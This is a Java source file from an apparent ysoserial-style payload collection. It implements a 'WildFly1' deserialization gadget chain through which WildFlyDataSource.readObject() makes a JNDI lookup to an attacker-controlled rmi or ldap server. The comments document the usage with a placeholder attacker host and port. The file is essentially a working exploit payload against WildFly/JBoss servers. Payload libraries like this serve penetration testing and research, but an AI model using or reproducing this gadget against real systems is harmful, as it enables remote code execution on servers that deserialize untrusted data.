package payloads;

import org.jboss.as.connector.subsystems.datasources.WildFlyDataSource;


import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;

import java.net.URL;

/**
 *
 * Gadget chain:
 *
 * org.jboss.as.connector.subsystems.datasources.WildFlyDataSource.readObject()
 * javax.naming.InitialContext.lookup()
 *
 *
 * Arguments: - (rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>
 *
 *
 * @author hugov
 *         https://www.synacktiv.com/publications/finding-gadgets-like-its-2022.html
 *
 * Command: rmi/ldap://x.x.x.x:xx/exploit
 *
 */

// test fail
// @PayloadTest(harness = "ysoserial.test.payloads.JRMPReverseConnectTest")
@Dependencies({ "org.wildfly:wildfly-connector:26.0.1.Final", "org.jboss.as:jboss-as-connector:7.1.3.Final"})
@Authors({ Authors.HUGOW })
public class WildFly1 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {

        return new WildFlyDataSource(null, command);
    }

    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(WildFly1.class, command, fusion);
    }
}
